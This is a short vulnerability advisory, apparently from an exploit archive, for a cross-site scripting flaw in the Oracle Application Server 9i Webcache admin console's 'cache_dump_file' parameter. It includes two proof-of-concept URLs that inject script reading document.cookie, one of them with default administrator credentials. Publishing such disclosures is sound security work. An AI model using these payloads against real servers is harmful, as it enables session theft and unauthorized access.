@@ -1,0 +1,8 @@
+source : http://www.securityfocus.com/bid/13421/info
+
+A remote cross-site scripting vulnerability affects the Oracle Application Server 9i Webcache administration console. This issue is due to a failure of the application to properly sanitize user-supplied input prior to including it in dynamically generated Web content.
+
+The issue affects the 'cache_dump_file' parameter of the 'webcacheadmin' script. 
+
+http://example.com:4000/webcacheadmin?SCREEN_ID=CGA.CacheDump&ACTION=Submit&index=1&cache_dump_file=/tmp/create_or_replace_file.txt<script>alert(document.cookie);</script>
+http://administrator:administrator@example.com:4000/webcacheadmin?SCREEN_ID=CGA.CacheDump&ACTION=Submit&index=1&cache_dump_file=/tmp/create_or_append_file.txt<script>alert(document.cookie);</script> 
